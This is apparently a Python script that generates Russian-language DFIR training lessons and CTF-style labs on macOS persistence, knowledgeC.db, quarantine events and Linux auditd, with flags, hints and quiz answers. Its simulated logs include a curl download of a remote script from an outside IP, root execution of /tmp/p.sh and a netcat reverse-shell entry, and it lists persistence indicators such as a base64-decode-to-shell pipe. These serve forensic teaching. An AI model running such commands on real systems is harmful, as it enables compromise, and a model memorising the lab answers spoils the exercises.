#!/usr/bin/env python3
"""Generate forensics gB batch B10-A: macOS (3) + Linux (2) deep artifacts."""
import os, json

C = "content/forensics"
L = "content/labs"


def w(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text.rstrip() + "\n")


def lesson(lid, title, parent, order, diff, mins, tags, prereq, useful, summary, lab, body):
    files = lab["files"]
    hints = "\n".join(f"    - '{h}'" for h in lab["hints"])
    toolset = ", ".join(lab["toolset"])
    fm = f"""---
id: {lid}
title: "{title}"
category: forensics
parent: {parent}
difficulty: {diff}
order: {order}
tags: [{tags}]
prerequisites: {prereq}
useful_for:
  - "CTF Forensics категория"
{chr(10).join('  - ' + json.dumps(u, ensure_ascii=False) for u in useful)}
estimated_minutes: {mins}
summary: "{summary}"
lab:
  kind: shell
  title: "{lab['title']}"
  toolset: [{toolset}]
  workdir: /home/student/task
  files: [{', '.join(files)}]
  check: "grep -q 'nto{{' found.txt"
  hints:
{hints}
---
{body}
"""
    w(f"{C}/{lid}.md", fm)

    # lab bundle
    fs = [{"path": "/home/student/task", "type": "dir"},
          {"path": "/home/student/task/task.md", "text": lab["task"]}]
    for name, text in lab["seeds"].items():
        fs.append({"path": f"/home/student/task/{name}", "text": text, "mode": "644"})
    bundle = {
        "id": lid,
        "workdir": "/home/student/task",
        "hostname": "lab",
        "expect": {"file": "/home/student/task/found.txt", "contains": lab["flag"]},
        "fs": fs,
    }
    w(f"{L}/{lid}.json", json.dumps(bundle, ensure_ascii=False, indent=2))


# --------------------------------------------------------------------------
# macOS — parent forensics-macos-deep (3 -> 6)
# --------------------------------------------------------------------------

lesson(
    "macos-persistence",
    "Persistence на macOS: LaunchAgents и LaunchDaemons",
    "forensics-macos-deep", 4, "hard", 55,
    "macos, persistence, launchagents, launchdaemons, plist, forensics",
    "[forensics-macos-deep, forensics-macos-artifacts]",
    ["DFIR / Incident Response", "macOS forensics", "Threat Hunting"],
    "Как macOS запускает программы автоматически и как по plist-файлам LaunchAgents/LaunchDaemons найти закрепление злоумышленника.",
    dict(
        title="Практика: найти закрепление в plist",
        toolset=["core", "grep", "strings"],
        files=["task.md", "com.apple.softwareupdated.plist"],
        hints=[
            "Посмотри список автозапуска: `cat com.apple.softwareupdated.plist`.",
            "Найди путь к запускаемой программе: `grep -i ProgramArguments com.apple.softwareupdated.plist`.",
            "Проверь строки с меткой: `grep nto com.apple.softwareupdated.plist`.",
            "Собери ответ: `grep nto com.apple.softwareupdated.plist > found.txt`.",
        ],
        flag="nto{l4unch4g3nt_p3rs1st3nc3}",
        task=("# Задача: закрепление на macOS\n\n"
              "`com.apple.softwareupdated.plist` — подозрительный LaunchAgent.\n"
              "Найди путь запускаемой программы и метку.\n\n"
              "1. `cat com.apple.softwareupdated.plist`.\n"
              "2. `grep -i ProgramArguments com.apple.softwareupdated.plist`.\n"
              "3. `grep nto com.apple.softwareupdated.plist > found.txt`.\n"),
        seeds={
            "com.apple.softwareupdated.plist": (
                "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
                "<plist version=\"1.0\">\n<dict>\n"
                "  <key>Label</key><string>com.apple.softwareupdated</string>\n"
                "  <key>ProgramArguments</key>\n  <array>\n"
                "    <string>/bin/sh</string>\n"
                "    <string>-c</string>\n"
                "    <string>/Users/jdoe/Library/Caches/.upd/agent</string>\n"
                "  </array>\n"
                "  <key>RunAtLoad</key><true/>\n"
                "  <key>KeepAlive</key><true/>\n"
                "  <key>StartInterval</key><integer>300</integer>\n"
                "  <key>Disabled</key><false/>\n"
                "  <!-- hidden implant id: nto{l4unch4g3nt_p3rs1st3nc3} -->\n"
                "</dict>\n</plist>\n"),
        },
    ),
    body=r'''
## Вопрос, с которого всё начинается

На macOS-хосте после инцидента нужно понять: что запускается автоматически? На Windows ты бы
пошёл смотреть Run-ключи реестра и задачи планировщика. У macOS та же роль у **launchd** —
системного менеджера, который по plist-файлам запускает программы при входе, по таймеру или
при событии. Если злоумышленник закрепился, почти наверняка он оставил такой plist.

## Наш пример: подозрительный LaunchAgent

Тебе попал файл автозапуска:

```
~/Library/LaunchAgents/com.apple.softwareupdated.plist
```

Имя мимикрирует под системный процесс Apple, но лежит в пользовательской папке — уже странно.
Разберём его целиком.

## Что такое plist

**plist** (property list) — это формат описания настроек macOS. Это либо XML, либо бинарный
формат `bplist00`, либо JSON. Запускаемая программа задаётся в словаре `<dict>`, где ключи —
это имена настроек, а значения — строки, числа, массивы или булевы флаги. Ключевые для нас:

| Ключ | Что значит |
|------|------------|
| `Label` | уникальное имя задачи |
| `ProgramArguments` | команда и аргументы запуска |
| `Program` | путь к бинарнику (альтернатива массиву) |
| `RunAtLoad` | запускать при загрузке задачи |
| `KeepAlive` | держать процесс живым, перезапускать |
| `StartInterval` | запуск каждые N секунд |
| `StartCalendarInterval` | запуск по расписанию |
| `WatchPaths` | запуск при изменении пути |
| `Disabled` | отключена ли задача |

## Шаг 1: три места автозапуска

launchd читает plist из нескольких каталогов, и это важно для расследования:

```
/Library/LaunchDaemons/      # системные демоны, старт при загрузке, от root
/Library/LaunchAgents/       # агенты всех пользователей, старт при логине
~/Library/LaunchAgents/      # агенты конкретного пользователя
```

Пользовательский `~/Library/LaunchAgents/` — любимое место вредоносов: туда не нужен root.
Системный `LaunchDaemons` требует root, но зато даёт запуск до входа пользователя.

## Шаг 2: читаем наш plist

```
$ cat com.apple.softwareupdated.plist
<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0">
<dict>
  <key>Label</key><string>com.apple.softwareupdated</string>
  <key>ProgramArguments</key>
  <array>
    <string>/bin/sh</string>
    <string>-c</string>
    <string>/Users/jdoe/Library/Caches/.upd/agent</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  ...
```

Читаем по-человечески: задача с меткой `com.apple.softwareupdated` при загрузке запускает
`/bin/sh -c /Users/jdoe/Library/Caches/.upd/agent`. Бинарник спрятан в скрытом каталоге
`.upd` внутри `Library/Caches` — это классический приём: имя похоже на кэш, а `KeepAlive`
означает, что процесс будет перезапускаться, даже если его убить.

## Шаг 3: что искать в любом plist

Смотри не на `Label` (его подделывают), а на **`ProgramArguments` / `Program`**. Признаки
вредоносного закрепления:

- запуск через `/bin/sh -c` с длинной командой;
- бинарник в `/tmp`, `/var/tmp`, `~/Library/Caches`, скрытой папке с точкой;
- base64-строка прямо в аргументах (`echo <blob> | base64 -d | sh`);
- скачивание из сети (`curl`, `osascript`);
- `RunAtLoad` + `KeepAlive` на непонятный бинарник;
- несоответствие `Label` и реального пути (Apple-имя, но путь пользователя).

## Шаг 4: как перечислять задачи

Ручной обход каталогов:

```
$ ls -la ~/Library/LaunchAgents /Library/LaunchAgents /Library/LaunchDaemons
```

Загруженные сейчас задачи (включая те, чьи plist удалили, но процесс жив):

```
$ launchctl list | grep -v com.apple
```

Для бинарных plist используй `plutil -p file.plist` — он выведет их как XML/текст. Для
проверки подписи бинарника, на который ссылается задача, — `codesign -dv --verbose=4 <bin>`:
неподписанный или самоподписанный бинарник в автозапуске почти всегда подозрителен.

## Шаг 5: таймстемпы как улика

Дата создания plist (`stat -f '%SB %N'`) показывает, когда закрепились. Сопоставь её с
первым запуском процесса и с событиями в unified log — получишь момент компромисса.
Удалённый, но оставшийся в `launchctl list` агент указывает на попытку замести следы.

## Что мы теперь знаем

- Автозапуск macOS живёт в plist-файлах, которые читает launchd.
- Ключевые поля — `ProgramArguments`/`Program`, `RunAtLoad`, `KeepAlive`.
- Пользовательский `~/Library/LaunchAgents/` — типовое место закрепления.
- Ищи запуск через shell, бинарники в кэше/скрытых папках, подмену `Label`.
- `launchctl list` и `plutil -p` помогают искать даже удалённые задачи.

## Квиз

Проверь себя.

```quiz
- question: В каком каталоге вредонос чаще всего закрепляется без прав root?
  options: ['/Library/LaunchDaemons/', '~/Library/LaunchAgents/', '/System/Library/LaunchDaemons/', '/private/var/db/launchd/']
  answer: 1
  explanation: Пользовательский ~/Library/LaunchAgents/ не требует root и стартует при логине пользователя.
- question: Какой ключ plist заставляет задачу запускаться при загрузке?
  options: ['StartInterval', 'WatchPaths', 'RunAtLoad', 'Disabled']
  answer: 2
  explanation: RunAtLoad запускает программу сразу при загрузке задачи launchd.
- question: Что сильнее всего намекает на вредоносный LaunchAgent?
  options: ['Label похож на com.apple.*', 'ProgramArguments запускает /bin/sh -c с бинарником в скрытой папке кэша', 'Указан StartInterval', 'Файл лежит в ~/Library']
  answer: 1
  explanation: Запуск через shell скрытого бинарника из кэша — классический признак закрепления; Label легко подделать.
- question: Чем вывести содержимое бинарного plist в читаемом виде?
  options: ['cat file.plist', 'plutil -p file.plist', 'xxd file.plist', 'strings -n 2 file.plist']
  answer: 1
  explanation: plutil -p разбирает и бинарный, и XML plist в человекочитаемый вид.
```

## Куда дальше

Теперь ты умеешь находить закрепление на macOS. В следующем уроке разберём `knowledgeC.db` —
базу, которая расскажет, когда пользователь был активен и какие приложения запускал. Главное
запомни: **смотри не на имя задачи, а на то, что она реально запускает**.

## Где пригодится

- DFIR на macOS: поиск персистентности после компромисса.
- CTF-категория Forensics с дампом файловой системы macOS.
- Threat hunting: периодический аудит автозапуска парка Mac.
''',
)

lesson(
    "macos-knowledgec",
    "knowledgeC.db: история активности пользователя macOS",
    "forensics-macos-deep", 5, "hard", 50,
    "macos, knowledgec, coredatet, usage, activity, sqlite, forensics",
    "[forensics-macos-deep, forensics-macos-artifacts]",
    ["DFIR / Incident Response", "macOS forensics", "User activity analysis"],
    "Что хранит knowledgeC.db (CoreDuet) и как по ней восстановить, когда пользователь работал, какие приложения запускал и когда блокировал экран.",
    dict(
        title="Практика: активность из knowledgeC",
        toolset=["core", "grep", "strings"],
        files=["task.md", "knowledgeC_dump.txt"],
        hints=[
            "Посмотри имена потоков: `grep ZSTREAMNAME knowledgeC_dump.txt`.",
            "Найди событие блокировки экрана: `grep -i lock knowledgeC_dump.txt`.",
            "Ищи метку: `grep nto knowledgeC_dump.txt`.",
            "Собери ответ: `grep nto knowledgeC_dump.txt > found.txt`.",
        ],
        flag="nto{kn0wl3dg3c_us4g3}",
        task=("# Задача: активность из knowledgeC.db\n\n"
              "`knowledgeC_dump.txt` — выгрузка строк базы CoreDuet.\n"
              "Определи, когда пользователь был активен, и найди метку.\n\n"
              "1. `grep ZSTREAMNAME knowledgeC_dump.txt`.\n"
              "2. `grep -i lock knowledgeC_dump.txt`.\n"
              "3. `grep nto knowledgeC_dump.txt > found.txt`.\n"),
        seeds={
            "knowledgeC_dump.txt": (
                "ZOBJECT rows (id, ZSTREAMNAME, ZVALUE, ZSTARTDATE, ZENDDATE)\n"
                "1  /app/usage        com.apple.Safari            2025-05-01 08:12:03  2025-05-01 08:41:55\n"
                "2  /app/usage        com.apple.mail              2025-05-01 08:42:01  2025-05-01 09:03:10\n"
                "3  /app/inFocus      com.apple.Terminal          2025-05-01 09:03:20  2025-05-01 09:14:02\n"
                "4  /device/isLocked  1                           2025-05-01 09:14:02  2025-05-01 09:20:44\n"
                "5  /device/isLocked  0                           2025-05-01 09:20:44  \n"
                "6  /app/usage        com.apple.dt.Xcode        2025-05-01 09:21:00  2025-05-01 11:40:00\n"
                "7  /safari/history   https://intranet.local     2025-05-01 09:05:00  2025-05-01 09:05:01\n"
                "note: stream marker nto{kn0wl3dg3c_us4g3}\n"),
        },
    ),
    body=r'''
## Вопрос, с которого всё начинается

Тебе нужно доказать, что подозреваемый был за машиной в определённое время, и узнать, какие
приложения он запускал. На macOS для этого есть `knowledgeC.db` — тихая база, о которой
знают немногие. Что она хранит и как из неё достать хронологию?

## Наш пример: база CoreDuet

```
/private/var/db/CoreDuet/Knowledge/knowledgeC.db
```

Это **SQLite**-база системы **CoreDuet** — механизма, который учится на поведении
пользователя (чтобы вовремя показать уведомление или подсказать приложение). Побочный
эффект — подробная история активности, ценная для расследования.

## Как устроена база

Главная таблица — `ZOBJECT`. У неё есть колонки:

| Колонка | Что содержит |
|---------|--------------|
| `ZSTREAMNAME` | тип потока событий (`/app/usage`, `/device/isLocked`) |
| `ZSTARTDATE` | начало события (Apple Cocoa/Unix время) |
| `ZENDDATE` | конец события |
| `ZVALUE` | значение (имя приложения, 0/1 и т. п.) |

Имена потоков — это фактически словарь того, что система записывает: запуск и фокус
приложений, блокировка экрана, зарядка, использование Safari, подключение к сети.

## Шаг 1: какие потоки вообще есть

```
$ sqlite3 knowledgeC.db "SELECT DISTINCT ZSTREAMNAME FROM ZOBJECT ORDER BY 1"
/app/inFocus
/app/usage
/device/isLocked
/device/isPluggedIn
/safari/history
```

Уже это перечисление много говорит: `/app/inFocus` — приложение на переднем плане,
`/app/usage` — периоды использования, `/device/isLocked` — блокировки экрана.

## Шаг 2: восстанавливаем таймлайн

```
$ sqlite3 knowledgeC.db \
  "SELECT datetime(ZSTARTDATE+978307200,'unixepoch'), ZSTREAMNAME, ZVALUE \
   FROM ZOBJECT WHERE ZSTREAMNAME='/app/inFocus' ORDER BY ZSTARTDATE"
2025-05-01 09:03:20|/app/inFocus|com.apple.Terminal
2025-05-01 09:21:00|/app/inFocus|com.apple.dt.Xcode
```

Число `978307200` — сдвиг между эпохой Apple (2001-01-01) и Unix (1970-01-01). Добавив его,
получаем нормальные даты. Так строится таблица «во сколько что было на экране».

## Шаг 3: блокировки и активность

Поток `/device/isLocked` со значением `1` — экран заблокирован, `0` — разблокирован. По этим
событиям видно, когда пользователь подходил к машине. Пары «заблокировал → разблокировал»
дают интервалы отсутствия; именно в такие окна удобно датировать автоматические действия
вредоноса (пока хозяин отошёл).

## Шаг 4: связь с другими артефактами

`knowledgeC.db` ценна в связке: сопоставь активность приложений с историей браузера
(`History.db`), с `unified log` и с сетевыми соединениями. Если в момент, когда пользователь
работал в Xcode, система запускала подозрительный процесс — это подозрительно. А если
вредонос действовал только в интервалы блокировки экрана — он автоматизирован.

## Шаг 5: где ещё смотреть

Рядом лежат связанные базы CoreDuet: `/private/var/db/CoreDuet/People/` (контакты и
взаимодействия), а также `knowledgeC.db-shm`/`-wal` (журналы SQLite). Если база «залочена»
живой системой, копируй её вместе с `-wal` и `-shm`, иначе потеряешь последние события.
Для расшифровки на зашифрованном томе нужен ключ (FileVault/`libfvde`).

## Что мы теперь знаем

- `knowledgeC.db` — SQLite-база CoreDuet с историей активности macOS.
- Таблица `ZOBJECT`, колонки `ZSTREAMNAME`, `ZSTARTDATE`, `ZENDDATE`, `ZVALUE`.
- Время в эпохе Apple; для Unix-времени добавь 978307200.
- Потоки `/app/usage`, `/app/inFocus`, `/device/isLocked` дают хронологию работы.
- Базу копируют вместе с `-wal`/`-shm`, иначе теряют свежие события.

## Квиз

Проверь себя.

```quiz
- question: В каком формате хранится knowledgeC.db?
  options: ['Бинарный EVTX', 'SQLite', 'XML plist', 'JSON']
  answer: 1
  explanation: Это SQLite-база CoreDuet; читается любым SQLite-клиентом.
- question: Какая таблица содержит события активности?
  options: ['ZOBJECT', 'Manifest', 'TCC', 'FSEvents']
  answer: 0
  explanation: Основная таблица knowledgeC.db — ZOBJECT, где ZSTREAMNAME задаёт тип потока.
- question: Что нужно прибавить к времени Apple, чтобы получить Unix-время?
  options: ['0', '978307200', '3600', '11644473600']
  answer: 1
  explanation: Эпоха Apple — 2001-01-01, что на 978307200 секунд позже Unix-эпохи.
- question: Зачем копировать knowledgeC.db вместе с -wal и -shm?
  options: ['Чтобы уменьшить размер', 'Иначе потеряются свежие события из журнала', 'Без них база не откроется вообще', 'Это требование Apple']
  answer: 1
  explanation: Журналы -wal/-shm содержат ещё не перенесённые в основную базу события.
```

## Куда дальше

Дальше — `quarantine events`: журнал, куда macOS пишет, откуда пришёл каждый скачанный
файл. Это связка «пользователь → файл → источник». Главное запомни: **knowledgeC.db
отвечает на вопрос «когда и что делал пользователь», а не только «какие файлы есть»**.

## Где пригодится

- DFIR на macOS: восстановление хронологии активности.
- CTF-категория Forensics с дампом macOS.
- Расследования инсайдерских инцидентов: кто и когда был за машиной.
''',
)

lesson(
    "macos-quarantine-deep",
    "Quarantine events macOS: откуда пришёл файл",
    "forensics-macos-deep", 6, "medium", 45,
    "macos, quarantine, xattr, lsquarantine, downloads, forensics",
    "[forensics-macos-deep, forensics-macos-artifacts]",
    ["DFIR / Incident Response", "macOS forensics", "Malware triage"],
    "Как работает карантин macOS: атрибут com.apple.quarantine, база LSQuarantineEvent и как связать скачанный файл с источником и приложением.",
    dict(
        title="Практика: источник скачанного файла",
        toolset=["core", "grep", "strings"],
        files=["task.md", "QuarantineEventsV2.txt"],
        hints=[
            "Посмотри строки базы карантина: `cat QuarantineEventsV2.txt`.",
            "Найди запись про DMG: `grep -i dmg QuarantineEventsV2.txt`.",
            "Ищи метку: `grep nto QuarantineEventsV2.txt`.",
            "Собери ответ: `grep nto QuarantineEventsV2.txt > found.txt`.",
        ],
        flag="nto{qu4r4nt1n3_0r1g1n}",
        task=("# Задача: карантин macOS\n\n"
              "`QuarantineEventsV2.txt` — выгрузка базы карантина.\n"
              "Найди, откуда скачали файл, и метку.\n\n"
              "1. `cat QuarantineEventsV2.txt`.\n"
              "2. `grep -i dmg QuarantineEventsV2.txt`.\n"
              "3. `grep nto QuarantineEventsV2.txt > found.txt`.\n"),
        seeds={
            "QuarantineEventsV2.txt": (
                "LSQuarantineEvent rows (id, timestamp, agent, origin, url)\n"
                "1  2025-04-30 12:01:11  com.apple.Safari          Safari      https://intranet.local/reports/q1.pdf\n"
                "2  2025-05-01 08:20:44  com.apple.Safari          Safari      https://cdn.example.net/tools/Updater.dmg\n"
                "3  2025-05-01 08:21:02  com.apple.finder          Finder      /Users/jdoe/Downloads/Updater.dmg\n"
                "4  2025-05-02 10:10:10  com.apple.mail            Mail        /Users/jdoe/Downloads/invoice.zip\n"
                "note: quarantine marker nto{qu4r4nt1n3_0r1g1n}\n"),
        },
    ),
    body=r'''
## Вопрос, с которого всё начинается

На Mac нашли вредоносный файл. Первый вопрос следователя: **откуда он взялся** — скачали из
интернета, принесли на флешке или прислали почтой? macOS сама отвечает на это: каждый
скачанный файл помечается «карантином», а события карантина хранятся в базе.

## Наш пример: скачанный DMG

В `~/Downloads` лежит `Updater.dmg`. Нужно понять, кто и откуда его скачал. Начнём с
атрибута карантина у самого файла.

## Что такое карантин

Когда приложение скачивает файл, macOS ставит на него **расширенный атрибут** (xattr)
`com.apple.quarantine`. Посмотреть его:

```
$ xattr -p com.apple.quarantine Updater.dmg
0083;6a1b2c3d;Safari;1234ABCD-...-EF12
```

Значение — набор полей через `;`:

| Поле | Что означает |
|------|--------------|
| флаги | как обрабатывать (0001 запрещён к запуску и т. п.) |
| время | когда файл скачали (hex-время) |
| агент | кто скачал (Safari, Chrome, Mail) |
| UUID | идентификатор события |

## Шаг 1: база событий карантина

Xattr живёт на самом файле, но есть и центральная база событий:

```
~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2
```

Это SQLite-база с таблицей `LSQuarantineEvent`. Колонки: `LSQuarantineTimeStamp`,
`LSQuarantineAgentName`, `LSQuarantineOriginURLString`, `LSQuarantineDataURLString`. По ним
видно **источник** (origin), **ссылку загрузки** (data URL) и **приложение-агента**.

## Шаг 2: сопоставляем файл и событие

UUID из xattr совпадает с записью в базе. Значит, для нашего `Updater.dmg` можно найти:

```
$ sqlite3 QuarantineEventsV2 \
  "SELECT datetime(LSQuarantineTimeStamp+978307200,'unixepoch'), LSQuarantineAgentName, LSQuarantineOriginURLString \
   FROM LSQuarantineEvent ORDER BY LSQuarantineTimeStamp"
2025-05-01 08:20:44|Safari|https://cdn.example.net/tools/Updater.dmg
```

Ответ: файл скачал Safari 1 мая в 08:20 с `cdn.example.net`. Это уже зацепка для анализа
домена и цепочки доставки.

## Шаг 3: зачем это расследованию

Карантин — это **провенанс**: связка «файл → приложение → URL → время». Если несколько
заражённых машин скачали один и тот же файл с одного домена, карантин докажет общий вектор.
Даже если файл удалили, запись в базе остаётся — и хранит URL.

## Шаг 4: тонкости и ограничения

- Пользователь может очистить xattr (`xattr -d`), но запись в базе `QuarantineEventsV2`
  остаётся — поэтому база ценнее атрибута.
- База хранит ограниченное число записей (старые вытесняются), поэтому её копируют сразу.
- Время снова в эпохе Apple — прибавляй 978307200.
- Если приложение скачало файл без карантина (некоторые CLI-загрузчики, `curl`), события не
  будет — тогда источник ищут по истории браузера и сетевым логам.

## Шаг 5: где искать ещё

Дополни `QuarantineEventsV2` базой FSEvents (создание файла) и историей Safari (`History.db`).
Три артефакта вместе дают полную картину: когда файл появился, каким браузером и по какой
ссылке. Это классический сценарий анализа «первого файла» в цепочке заражения.

## Что мы теперь знаем

- Скачанные файлы помечаются xattr `com.apple.quarantine`.
- События хранятся в SQLite-базе `QuarantineEventsV2`, таблица `LSQuarantineEvent`.
- Поля origin/data URL дают источник и ссылку загрузки.
- Время — эпоха Apple (+978307200 для Unix).
- База остаётся после удаления файла и ценнее самого атрибута.

## Квиз

Проверь себя.

```quiz
- question: Какой расширенный атрибут помечает скачанный файл на macOS?
  options: ['user.comment', 'com.apple.quarantine', 'com.apple.metadata', 'com.apple.lastuseddate']
  answer: 1
  explanation: com.apple.quarantine ставится приложениями-загрузчиками на скачанные файлы.
- question: Где хранится центральная база событий карантина?
  options: ['/var/log/quarantine.log', 'com.apple.LaunchServices.QuarantineEventsV2', 'knowledgeC.db', 'TCC.db']
  answer: 1
  explanation: Это SQLite-база QuarantineEventsV2 с таблицей LSQuarantineEvent.
- question: Что даёт поле LSQuarantineOriginURLString?
  options: ['Локальный путь файла', 'Источник/URL, откуда пришёл файл', 'Хеш файла', 'Имя пользователя']
  answer: 1
  explanation: Origin URL — это источник загрузки, ключевая зацепка для цепочки доставки.
- question: Почему база карантина ценнее самого атрибута xattr?
  options: ['Она больше', 'Запись остаётся даже после удаления атрибута и хранит URL', 'Она шифруется', 'Её нельзя подделать']
  answer: 1
  explanation: Атрибут можно удалить, а запись в базе (с URL и временем) сохраняется.
```

## Куда дальше

Мы закончили ветку защищённых баз macOS. Дальше перейдём к Linux: разберём `auditd` — ядро
аудита, которое фиксирует системные вызовы и даёт самый детальный след. Главное запомни:
**карантин — это провенанс файла, связка «откуда → чем → когда»**.

## Где пригодится

- DFIR на macOS: определение вектора доставки вредоноса.
- CTF-категория Forensics с образом macOS.
- Threat hunting: поиск скачиваний с подозрительных доменов.
''',
)

# --------------------------------------------------------------------------
# Linux — parent forensics-linux-artifacts-advanced (4 -> 6)
# --------------------------------------------------------------------------

lesson(
    "linux-auditd-deep",
    "auditd: аудит системных вызовов и разбор audit.log",
    "forensics-linux-artifacts-advanced", 5, "hard", 55,
    "linux, auditd, audit, syscall, ausearch, aureport, forensics",
    "[forensics-linux-artifacts-advanced, forensics-linux-artifacts]",
    ["DFIR / Incident Response", "Linux forensics", "Threat Hunting"],
    "Как устроен Linux-аудит (auditd): правила, ключи, записи syscall/execve и практический разбор audit.log через ausearch и aureport.",
    dict(
        title="Практика: разбор audit.log",
        toolset=["core", "grep", "strings"],
        files=["task.md", "audit.log"],
        hints=[
            "Посмотри строки журнала: `cat audit.log`.",
            "Найди запуск процессов: `grep -i execve audit.log`.",
            "Найди события по ключу: `grep key= audit.log`.",
            "Собери ответ: `grep nto audit.log > found.txt`.",
        ],
        flag="nto{4ud1td_execv3_tr4c3}",
        task=("# Задача: разбор audit.log\n\n"
              "`audit.log` — фрагмент журнала Linux-аудита.\n"
              "Найди запуск подозрительного процесса и метку.\n\n"
              "1. `cat audit.log`.\n"
              "2. `grep -i execve audit.log`.\n"
              "3. `grep nto audit.log > found.txt`.\n"),
        seeds={
            "audit.log": (
                "type=SYSCALL msg=audit(1746086401.123:101): arch=c000003e syscall=59 success=yes "
                "exe=\"/usr/bin/curl\" key=\"recon\" pid=2211 uid=33\n"
                "type=EXECVE msg=audit(1746086401.123:101): argc=4 a0=\"curl\" "
                "a1=\"-s\" a2=\"http://198.51.100.9/p.sh\" a3=\"-o\"\n"
                "type=SYSCALL msg=audit(1746086455.004:102): arch=c000003e syscall=59 success=yes "
                "exe=\"/bin/bash\" key=\"exec\" pid=2212 uid=0\n"
                "type=EXECVE msg=audit(1746086455.004:102): argc=3 a0=\"bash\" a1=\"/tmp/p.sh\"\n"
                "type=SYSCALL msg=audit(1746086460.900:103): arch=c000003e syscall=2 success=yes "
                "exe=\"/usr/bin/nc\" key=\"reverse\" pid=2213 uid=0\n"
                "note: audit marker nto{4ud1td_execv3_tr4c3}\n"),
        },
    ),
    body=r'''
## Вопрос, с которого всё начинается

На Linux-сервере что-то произошло, но прикладные логи молчат. Нужен след уровня ядра: кто
запускал процессы, какие файлы открывались, кто менял права. Ответ даёт **auditd** —
подсистема аудита Linux, которая пишет события в `audit.log`.

## Наш пример: подозрительная цепочка

У нас фрагмент `/var/log/audit/audit.log`:

```
type=SYSCALL msg=audit(1746086401.123:101): arch=c000003e syscall=59 success=yes \
exe="/usr/bin/curl" key="recon" pid=2211 uid=33
type=EXECVE msg=audit(1746086401.123:101): argc=4 a0="curl" a1="-s" \
a2="http://198.51.100.9/p.sh" a3="-o"
```

Разберём, что здесь написано, и как из таких строк собрать историю атаки.

## Что такое auditd и правила

auditd — демон, который по **правилам** (`/etc/audit/rules.d/*.rules`) перехватывает
системные вызовы (**syscall** — запрос программы к ядру). Правило говорит: «логируй
syscall такой-то с таким-то ключом». Например, правило `-a always,exit -F arch=b64 -S execve
-k exec` пишет каждый запуск программы с ключом `exec`. Ключ (`key=`) — твоя метка, по
которой потом фильтруют события.

## Шаг 1: типы записей

Одно событие может быть разбито на несколько строк разных типов:

| Тип | Что содержит |
|-----|--------------|
| `SYSCALL` | номер вызова, `exe`, `pid`, `uid`, `success`, `key` |
| `EXECVE` | аргументы запуска (`a0`, `a1`, …) |
| `PATH` | пути к файлам, с которыми работал вызов |
| `CWD` | рабочий каталог процесса |
| `PROCTITLE` | полная командная строка |

Объединяет их `msg=audit(<время>:<id>)` — одинаковые время и id принадлежат одному событию.

## Шаг 2: читаем execve

Из `SYSCALL` мы узнаём: сработал syscall 59 (`execve` — запуск программы), процесс запустил
`/usr/bin/curl` под `uid=33` (это `www-data` — веб-сервер!). Из `EXECVE` видим аргументы:
`curl -s http://198.51.100.9/p.sh -o`. Вывод: скомпрометированный веб-процесс скачивает
скрипт с внешнего IP. Следующее событие (id 102) — `/bin/bash /tmp/p.sh` от `uid=0`:
скрипт выполнился уже от root.

## Шаг 3: инструменты

Вручную grep по большому логу неудобен. `ausearch` фильтрует по ключу, пользователю, времени:

```
$ ausearch -k exec -i
```

Флаг `-i` переводит коды в читаемый вид (номера syscall → имена, uid → пользователи).
`aureport` строит сводки:

```
$ aureport --auth            # отчёты аутентификации
$ aureport -x                # исполненные программы
```

`aureport -x` часто сразу показывает аномалии — редкие бинарники, запущенные от необычных
пользователей.

## Шаг 4: что искать

Признаки компромисса в аудите: запуск `curl`/`wget` из веб-процесса; shell (`bash`, `sh`)
с `uid=0` после сетевой активности; `nc`/`socat` с флагом reverse (`-e`); чтение `/etc/shadow`
(`syscall=2` — `open`); `chmod +x` на файл в `/tmp`. Цепочка «recon → exec → reverse» в нашем
примере — это готовый сценарий «веб-shell → скачивание → реверс-шелл → root».

## Шаг 5: ограничения

auditd пишет много и быстро забивает диск, поэтому правила обычно узкие — часть событий
отсутствует. Если аудит не был настроен заранее, восстановить детальную историю сложно: тогда
смотри `/proc`, shell history и системные логи. Зато `auditd` — единственный источник, который
доказывает запуск процесса **на уровне ядра**, и его сложнее подделать, чем прикладной лог.

## Что мы теперь знаем

- auditd логирует syscall по правилам с ключами в `audit.log`.
- Событие = строки `SYSCALL`/`EXECVE`/`PATH` с общим `msg=audit(время:id)`.
- `syscall=59` — `execve` (запуск программы); `EXECVE` даёт аргументы.
- `ausearch -k`/`ausearch -i` и `aureport -x` ускоряют разбор.
- Цепочки curl→bash→nc от необычного uid — сильный индикатор атаки.

## Квиз

Проверь себя.

```quiz
- question: Какой syscall в Linux соответствует запуску программы?
  options: ['open (2)', 'execve (59)', 'fork (57)', 'write (1)']
  answer: 1
  explanation: execve (номер 59 на x86-64) — системный вызов запуска исполняемого файла.
- question: Что объединяет строки SYSCALL, EXECVE и PATH в одно событие?
  options: ['pid', 'uid', 'одинаковый msg=audit(время:id)', 'exe']
  answer: 2
  explanation: Одно событие разбито на строки с одинаковым msg=audit(время:id).
- question: Что делает ключ key= в записи auditd?
  options: ['Шифрует запись', 'Метка правила, по которой фильтруют события', 'Задаёт уровень логирования', 'Указывает пользователя']
  answer: 1
  explanation: key= — это метка, заданная в правиле; по ней потом ищут через ausearch -k.
- question: Какой признак указывает на реверс-шелл в аудите?
  options: ['open /etc/shadow', 'запуск nc/socat с флагом -e от root', 'execve /usr/bin/apt', 'chmod на домашний каталог']
  answer: 1
  explanation: nc/socat с -e (выполнить команду) в связке с сетевым процессом — типичный реверс-шелл.
```

## Куда дальше

Дальше — бинарный журнал `journald`, который systemd пишет вместо текстовых логов. Там другой
формат, но та же задача: найти след. Главное запомни: **auditd — это след уровня ядра, самый
трудно подделываемый источник на Linux**.

## Где пригодится

- DFIR на Linux: восстановление цепочки атаки на уровне syscall.
- CTF-категория Forensics с дампом `/var/log/audit`.
- Threat hunting: правила аудита на критичные операции.
''',
)

lesson(
    "linux-journald-binary",
    "journald: разбор бинарного журнала systemd",
    "forensics-linux-artifacts-advanced", 6, "medium", 50,
    "linux, journald, systemd, journalctl, binary-log, forensics",
    "[forensics-linux-artifacts-advanced, forensics-linux-artifacts]",
    ["DFIR / Incident Response", "Linux forensics", "Log analysis"],
